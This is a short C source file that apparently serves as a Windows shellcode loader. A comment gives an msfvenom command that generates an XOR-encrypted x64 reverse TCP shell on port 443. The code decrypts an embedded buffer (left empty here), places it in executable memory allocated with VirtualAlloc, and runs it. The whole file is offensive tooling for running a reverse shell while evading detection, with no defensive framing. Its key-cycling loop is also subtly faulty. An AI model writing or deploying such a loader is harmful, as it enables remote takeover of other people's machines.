#include <windows.h>
#include <stdio.h>

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 --encrypt xor --encrypt-key test -f c -o enc.c
unsigned char buf[] = "";

void x(char *payload, int payload_length, char *key, int length) {
	int j = 0;

	for (int i = 0; i < payload_length - 1; i++) {
		if (j == length - 1) j = 0;
		payload[i] ^= key[j];
		unsigned char data = payload[i] ^ key[j];
		j++;
	}
}

int main()
{
	char key[] = "test";
	x((char*)buf, sizeof(buf), key, sizeof(key));	
	void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, buf, sizeof(buf));
	((void(*)())exec)();
}